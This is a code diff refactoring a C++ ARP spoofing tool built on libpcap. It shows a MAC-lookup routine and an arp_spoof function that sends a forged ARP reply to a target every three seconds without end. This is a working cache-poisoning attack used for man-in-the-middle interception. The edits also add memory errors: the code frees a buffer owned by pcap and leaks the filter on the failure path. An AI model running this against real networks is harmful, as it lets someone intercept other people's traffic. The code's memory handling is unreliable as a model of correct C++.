@@ -8,7 +8,7 @@
 #include <sys/ioctl.h>
 #include <unistd.h>
 
-#include "network/ArpPacket.h"
+#include "network/packet/ArpPacket.h"
 #include "network/utils.h"
 
 namespace network {
@@ -66,9 +66,9 @@ namespace network {
         ArpPacket arp(ARPOP_REQUEST,
                       smac, sip,
                       HwAddr(), tip);
-        arp.ether.dst = broadcast_mac;
-        const byte *packet = (byte *) arp;
-        if (pcap_sendpacket(desc, packet, ArpPacket::size) != 0) {
+        arp.ether.dst = HwAddr("FF:FF:FF:FF:FF:FF");
+
+        if (pcap_sendpacket(desc, arp.to_bytes().data(), ArpPacket::size) != 0) {
             std::cerr << "Error sending the packet : " << pcap_geterr(desc) << std::endl;
             exit(-1);
         }
@@ -79,17 +79,19 @@ namespace network {
             exit(-1);
         }
 
+        const byte *packet = new byte[8192];
         pcap_pkthdr *header;
         int res = 0;
         while ((res = pcap_next_ex(desc, &header, &packet)) >= 0) {
             if (res == 0) continue;
             arp = ArpPacket(packet);
             if (arp.arp.opcode == ARPOP_REPLY and arp.arp.sender_ip == tip) {
+                delete[](packet);
+                delete (filter);
                 return arp.arp.sender_mac;
             }
         }
-        delete (filter);
-        return broadcast_mac;
+        return HwAddr("FF:FF:FF:FF:FF:FF");
     }
 
     void arp_spoof(const char *dev, const std::string &sender, const std::string &target) {
@@ -102,19 +104,17 @@ namespace network {
         HwAddr tmac = get_target_mac(dev, tip);
 
         ArpPacket arp = ArpPacket(ARPOP_REPLY, smac, sip, tmac, tip);
-        byte *packet = (byte *) arp;
 
         std::cout << "start arp spoofing..." << std::endl;
         int i = 0;
         while (true) {
-            if (pcap_sendpacket(desc, packet, ArpPacket::size) != 0) {
+            if (pcap_sendpacket(desc, arp.to_bytes().data(), ArpPacket::size) != 0) {
                 std::cerr << "Error sending the packet : " << pcap_geterr(desc) << std::endl;
                 break;
             }
             std::cout << "sent packet: " << i++ << std::endl;
             sleep(3);
         }
-        free(packet);
         pcap_close(desc);
     }
 }
